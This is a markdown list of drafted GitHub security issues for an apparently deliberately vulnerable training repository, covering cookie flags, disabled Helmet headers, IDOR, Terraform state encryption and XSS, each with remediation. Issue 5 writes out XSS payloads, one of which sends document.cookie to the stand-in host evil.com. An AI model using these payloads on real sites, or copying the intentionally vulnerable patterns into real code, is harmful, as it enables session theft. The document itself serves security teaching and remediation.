# Security Issues to Create

Use the content below to create issues on GitHub. Assign to: `timothywarner`

---

## Issue 1: Session cookies lack httpOnly and secure flags

**Labels:** `security`, `vulnerability`, `high-priority`, `nodegoat`

### Description

The NodeGoat application has session cookies configured without critical security flags, making them vulnerable to XSS-based session hijacking.

### Location

`NodeGoat/server.js:78-100`

### Current Code

```javascript
app.use(session({
    secret: cookieSecret,
    saveUninitialized: true,
    resave: true
    // Missing: cookie: { httpOnly: true, secure: true }
}));
```

### Risk

- **Severity**: High
- **OWASP**: A2:2017 - Broken Authentication
- **CWE**: CWE-614 (Sensitive Cookie in HTTPS Session Without Secure Attribute)

### Remediation

Add secure cookie configuration:

```javascript
cookie: {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    maxAge: 3600000
}
```

---

## Issue 2: Helmet security middleware disabled in NodeGoat

**Labels:** `security`, `vulnerability`, `medium-priority`, `nodegoat`

### Description

Critical security headers are commented out in the NodeGoat server configuration, leaving the application vulnerable to clickjacking, MIME sniffing, and other attacks.

### Location

`NodeGoat/server.js:38-65`

### Disabled Security Headers

- `helmet.frameguard()` - Clickjacking protection
- `helmet.noCache()` - Cache poisoning protection
- `helmet.contentSecurityPolicy()` - XSS mitigation
- `helmet.hsts()` - HTTPS enforcement
- `nosniff()` - MIME type sniffing protection

### Risk

- **Severity**: Medium
- **OWASP**: A6:2017 - Security Misconfiguration
- **CWE**: CWE-693 (Protection Mechanism Failure)

### Remediation

Uncomment and enable helmet middleware with appropriate configuration for the training environment.

---

## Issue 3: IDOR vulnerability in document API allows unauthorized access

**Labels:** `security`, `vulnerability`, `high-priority`, `lesson-01`, `idor`

### Description

The IDOR demo application lacks proper authorization checks, allowing users to access documents belonging to other tenants by manipulating document IDs.

### Location

`lesson-01/demo-04-custom-scanners/idor-app/api/documents.js`

### Attack Vector

```bash
# Authenticated as user1, can access user2's documents
GET /api/documents/user2-doc-id
```

### Risk

- **Severity**: High
- **OWASP**: A1:2017 - Broken Access Control
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

### Note

This is intentionally vulnerable for training. Add documentation warning and ensure it's not accidentally deployed.

---

## Issue 4: Terraform state may contain sensitive data without encryption

**Labels:** `security`, `infrastructure`, `medium-priority`, `lesson-02`, `terraform`

### Description

The Terraform configuration in lesson-02 does not configure remote state with encryption, potentially exposing infrastructure secrets.

### Location

`lesson-02/demo-04-zero-trust/terraform/main.tf`

### Missing Configuration

```hcl
terraform {
  backend "s3" {
    encrypt = true
    # Missing: kms_key_id for server-side encryption
  }
}
```

### Risk

- **Severity**: Medium
- **CWE**: CWE-312 (Cleartext Storage of Sensitive Information)

### Remediation

Add backend configuration with encryption:

```hcl
backend "s3" {
  bucket         = "terraform-state-bucket"
  key            = "zero-trust/terraform.tfstate"
  region         = "us-east-1"
  encrypt        = true
  kms_key_id     = "alias/terraform-state-key"
  dynamodb_table = "terraform-locks"
}
```

---

## Issue 5: XSS vulnerabilities via eval() and innerHTML in demo code

**Labels:** `security`, `vulnerability`, `critical`, `lesson-01`, `xss`

### Description

The vulnerable React demo contains multiple XSS attack vectors including `eval()`, `innerHTML`, and `document.write()` that execute arbitrary JavaScript.

### Locations

`lesson-01/demo-03-xss/vulnerable-react-app/UserProfile.jsx`:
- Line 58: `bioRef.current.innerHTML = bio;`
- Line 127: `document.getElementById('search-results').innerHTML = ...`
- Line 156: `return eval(calculation);`
- Line 165: `document.write(...)`

### Attack Payloads

```javascript
// XSS via bio field
<img src=x onerror="alert(document.cookie)">

// Code injection via calculator
1+1; fetch('https://evil.com?c='+document.cookie)
```

### Risk

- **Severity**: Critical
- **OWASP**: A7:2017 - Cross-Site Scripting (XSS)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

### Note

This is the intentionally vulnerable version for training. Ensure clear labeling and never deploy to production environments.

---

## Quick Create Commands

Once you have `gh` CLI configured, run:

```bash
# Issue 1
gh issue create --title "[Security] NodeGoat: Session cookies lack httpOnly and secure flags" \
  --label "security,vulnerability,high-priority,nodegoat" \
  --assignee "timothywarner" \
  --body-file /tmp/issue1.md

# Or create all at once using the GitHub web UI
```
